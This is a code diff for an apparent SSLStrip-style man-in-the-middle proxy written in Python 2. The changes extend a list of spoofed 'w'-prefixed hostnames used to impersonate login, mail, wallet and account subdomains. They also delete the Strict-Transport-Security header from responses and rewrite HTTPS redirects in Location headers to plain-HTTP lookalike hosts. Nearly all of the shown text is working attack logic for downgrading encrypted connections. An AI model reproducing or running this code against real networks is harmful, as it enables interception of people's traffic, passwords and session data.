@@ -19,7 +19,7 @@
 # Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
 # USA
 
-version = 0.5
+version = 0.6
 banner = """\n
 
   ██████   ██████  ██▓        ██ ▄█▀ ██▓ ██▓     ██▓
@@ -66,7 +66,7 @@ class SSLStripRequestHandler(ProxyRequestHandler):
 		modified = False
 		print "[+] Original Headers:"
 		print req.headers
-		prefixes = ["wwww","waccounts","wmail","wbooks","wssl","wdrive","wmaps","wnews","wplay","wplus","wencrypted","wassets","wgraph","wfonts","wlogin","wsecure","wwiki","wwallet","wmyaccount","wphotos","wdocs","wlh3","wapis"]
+		prefixes = ["wwww","waccounts","wmail","wbooks","wssl","wdrive","wmaps","wnews","wplay","wplus","wencrypted","wassets","wgraph","wfonts","wlogin","wsecure","wwiki","wwallet","wmyaccount","wphotos","wdocs","wlh3","wapis","wb","ws","wbr","wna","wads","wlogin","wmm","wm","wmobile","wsb"]
 		for p in prefixes:
 			for h in req.headers:
 				if p in req.headers[h]:
@@ -91,8 +91,8 @@ class SSLStripRequestHandler(ProxyRequestHandler):
 	print "\n----------------------------[Response]--------------------------------"
 	if res.headers:
 		modified = False
-		#Protection Headers to Strip
-		protection_headers = ['Strict-Transport-Security']
+		#Protection HSTS Header to Strip
+		hsts = 'Strict-Transport-Security'
 		print "\n[+] Original Headers:"
 		print res.headers
 		print
@@ -101,14 +101,15 @@ class SSLStripRequestHandler(ProxyRequestHandler):
 				res.headers[h].replace("https://","http://w")
 				modified = True
 		try:
-			res.headers['Location'] = res.headers['Location'].replace("https://","http://w")
-			replaced_urls.append(res.headers['Location'])
-			modified = True
+			if res.headers[hsts]:
+				del res.headers[hsts]
+				modified = True
 		except:
 			pass
 		try:
-			for x in protection_headers:
-				del res.headers[x]
+			res.headers['Location'] = res.headers['Location'].replace("https://","http://w")
+			replaced_urls.append(res.headers['Location'])
+			modified = True
 		except:
 			pass
 		if modified:
@@ -118,8 +119,8 @@ class SSLStripRequestHandler(ProxyRequestHandler):
 	if res_body:
 		print "\n[+] Original Body:"
 		print res_body
-		if "302 Moved" in res_body:
-			res_body.replace("https://","http://w")
+		if scheme == "http":
+			return res_body
 		else:
 			try:
 				hds = {}
